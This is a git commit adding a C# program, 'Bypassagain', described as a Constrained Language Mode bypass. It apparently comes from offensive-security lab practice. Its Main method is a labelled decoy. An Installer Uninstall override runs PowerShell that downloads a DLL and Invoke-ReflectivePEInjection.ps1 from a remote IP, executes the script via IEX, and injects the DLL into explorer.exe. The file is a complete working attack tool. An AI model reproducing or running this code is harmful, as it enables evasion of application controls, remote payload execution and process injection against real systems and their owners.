cdbf19a79908e5d49e7ac5844ef6675c7e8453f6
sirjan <sirja@ZIZKA>
2025-05-20 10:01:05 +0200

    CLM bypass

---
+++ Bypassagain/Bypassagain/Program.cs
@@ -0,0 +1,36 @@
+﻿using System;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Configuration.Install;
+
+namespace Bypassagain
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.WriteLine("This is the main method which is a decoy");
+        }
+    }
+
+    [System.ComponentModel.RunInstaller(true)]
+    public class Sample : System.Configuration.Install.Installer
+    {
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.178/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.45.178/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
+
+            Runspace rs = RunspaceFactory.CreateRunspace();
+            rs.Open();
+
+            PowerShell ps = PowerShell.Create();
+            ps.Runspace = rs;
+
+            ps.AddScript(cmd);
+
+            ps.Invoke();
+
+            rs.Close();
+        }
+    }
+}
